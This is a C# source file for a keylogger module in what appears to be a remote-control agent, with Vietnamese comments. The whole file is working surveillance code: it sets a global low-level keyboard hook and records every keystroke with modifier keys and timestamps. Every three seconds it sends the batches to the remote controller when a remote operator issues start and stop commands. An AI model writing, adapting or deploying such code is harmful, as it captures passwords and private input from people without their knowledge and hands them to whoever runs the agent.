<file path="agent/Modules/KeyloggerModule.cs">
  1: using System;
  2: using System.Collections.Generic;
  3: using System.Collections.Concurrent;
  4: using System.Diagnostics;
  5: using System.Runtime.InteropServices;
  6: using System.Text.Json;
  7: using System.Threading;
  8: using System.Threading.Tasks;
  9: using AgentSystem.Core;
 10: using AgentSystem.Managers;
 11: 
 12: namespace AgentSystem.Modules
 13: {
 14:     public class KeyloggerModule : BaseModule
 15:     {
 16:         private bool isLogging = false;
 17:         private string activeCommandId = string.Empty;
 18:         private Thread hookThread; 
 19:         private uint hookThreadId = 0;
 20:         private readonly object _stateLock = new object();
 21: 
 22:         private readonly ConcurrentQueue<object> _keyQueue = new ConcurrentQueue<object>();
 23:         
 24:         // Thay Timer cũ bằng CancellationTokenSource + PeriodicTimer
 25:         private CancellationTokenSource flushCts;
 26: 
 27:         private const int WH_KEYBOARD_LL = 13;
 28:         private const int WM_KEYDOWN = 0x0100;
 29:         private const int WM_SYSKEYDOWN = 0x0104;
 30:         private const uint WM_QUIT = 0x0012;
 31: 
 32:         private LowLevelKeyboardProc hookProc; 
 33:         private IntPtr hookId = IntPtr.Zero;
 34: 
 35:         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 36: 
 37:         [DllImport("kernel32.dll")]
 38:         private static extern uint GetCurrentThreadId();
 39: 
 40:         [DllImport("user32.dll", SetLastError = true)]
 41:         private static extern bool PostThreadMessage(uint threadId, uint msg, IntPtr wParam, IntPtr lParam);
 42: 
 43:         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
 44:         private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
 45: 
 46:         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
 47:         [return: MarshalAs(UnmanagedType.Bool)]
 48:         private static extern bool UnhookWindowsHookEx(IntPtr hhk);
 49: 
 50:         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
 51:         private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
 52: 
 53:         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
 54:         private static extern IntPtr GetModuleHandle(string lpModuleName);
 55: 
 56:         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
 57:         private static extern IntPtr LoadLibrary(string lpFileName);
 58: 
 59:         [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
 60:         private static extern short GetAsyncKeyState(int keyCode);
 61: 
 62:         public override string[] SupportedCommands => new[] { "keylog_start", "keylog_stop" };
 63: 
 64:         public KeyloggerModule(IAgentContext context, SecurityManager security, UIManager ui) 
 65:             : base(context, security, ui)
 66:         {
 67:             hookProc = HookCallback; 
 68:         }
 69: 
 70:         public override async Task ExecuteAsync(string action, JsonElement parameters, string commandId)
 71:         {
 72:             if (action == "keylog_start")
 73:             {
 74:                 await StartLoggingAsync(commandId);
 75:             }
 76:             else if (action == "keylog_stop")
 77:             {
 78:                 StopLogging(commandId);
 79:             }
 80:         }
 81: 
 82:         public override void OnDisconnected()
 83:         {
 84:             StopLogging("auto_disconnect");
 85:             base.OnDisconnected();
 86:         }
 87: 
 88:         private Task StartLoggingAsync(string commandId)
 89:         {
 90:             lock (_stateLock)
 91:             {
 92:                 if (isLogging) return Task.CompletedTask;
 93:             }
 94: 
 95: 
 96: 
 97:             lock (_stateLock)
 98:             {
 99:                 if (isLogging) return Task.CompletedTask; 
100: 
101:                 activeCommandId = commandId;
102:                 isLogging = true;
103: 
104:                 // Hook bắt buộc chạy trên Thread có Message Loop
105:                 hookThread = new Thread(() =>
106:                 {
107:                     hookThreadId = GetCurrentThreadId();
108:                     hookId = SetHook(hookProc);
109:                     Application.Run(); 
110:                 });
111:                 
112:                 hookThread.SetApartmentState(ApartmentState.STA);
113:                 hookThread.IsBackground = true; 
114:                 hookThread.Start();
115: 
116:                 context.SendResponse(new { type = "keylog_started", agent_id = context.AgentId, command_id = commandId });
117:                 
118:                 flushCts = new CancellationTokenSource();
119:                 _ = FlushLoopAsync(flushCts.Token);
120:                 
121:                 return Task.CompletedTask;
122:             }
123:         }
124: 
125:         private void StopLogging(string commandId)
126:         {
127:             lock (_stateLock)
128:             {
129:                 if (!isLogging) return;
130:                 
131:                 // Hủy vòng lặp gửi dữ liệu
132:                 flushCts?.Cancel();
133:                 flushCts?.Dispose();
134:                 flushCts = null;
135:                 
136:                 if (hookId != IntPtr.Zero)
137:                 {
138:                     UnhookWindowsHookEx(hookId);
139:                     hookId = IntPtr.Zero;
140:                 }
141:                 if (hookThreadId != 0)
142:                 {
143:                     PostThreadMessage(hookThreadId, WM_QUIT, IntPtr.Zero, IntPtr.Zero);
144:                     hookThreadId = 0;
145:                 }
146: 
147:                 hookThread?.Join(500);
148:                 hookThread = null; 
149:                 isLogging = false;
150:                 FlushBuffer(); // Đẩy dữ liệu còn sót
151:                 
152:                 context.SendResponse(new { type = "keylog_stopped", agent_id = context.AgentId, command_id = commandId });
153:             }
154:         }
155: 
156:         private async Task FlushLoopAsync(CancellationToken token)
157:         {
158:             using var timer = new PeriodicTimer(TimeSpan.FromMilliseconds(3000));
159:             try
160:             {
161:                 while (await timer.WaitForNextTickAsync(token))
162:                 {
163:                     FlushBuffer();
164:                 }
165:             }
166:             catch (OperationCanceledException)
167:             {
168:                 // Vòng lặp dừng khi tắt module
169:             }
170:         }
171: 
172:         private IntPtr SetHook(LowLevelKeyboardProc proc)
173:         {
174:             IntPtr handle = LoadLibrary("user32.dll");
175:             return SetWindowsHookEx(WH_KEYBOARD_LL, proc, handle, 0);
176:         }
177: 
178:         private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
179:         {
180:             if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
181:             {
182:                 int vkCode = Marshal.ReadInt32(lParam);
183: 
184:                 bool isShift = (GetAsyncKeyState(0x10) & 0x8000) != 0; 
185:                 bool isCtrl = (GetAsyncKeyState(0x11) & 0x8000) != 0;  
186:                 bool isAlt = (GetAsyncKeyState(0x12) & 0x8000) != 0;   
187: 
188:                 var keyEvent = new
189:                 {
190:                     key = ((ConsoleKey)vkCode).ToString(), 
191:                     ctrl = isCtrl,
192:                     alt = isAlt,
193:                     shift = isShift,
194:                     timestamp_ms = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds()
195:                 };
196: 
197:                 _keyQueue.Enqueue(keyEvent);
198:             }
199:             return CallNextHookEx(hookId, nCode, wParam, lParam);
200:         }
201: 
202:         private void FlushBuffer()
203:         {
204:             var batchToSend = new List<object>();
205:             
206:             // Rút toàn bộ sự kiện hiện có trong Queue ra một cách an toàn và không lock
207:             while (_keyQueue.TryDequeue(out var item))
208:             {
209:                 batchToSend.Add(item);
210:             }
211: 
212:             if (batchToSend.Count == 0) return;
213: 
214:             context.SendResponse(new
215:             {
216:                 type = "keylog",
217:                 command_id = activeCommandId,
218:                 events = batchToSend,
219:                 agent_id = context.AgentId
220:             });
221:         }
222:     }
223: }
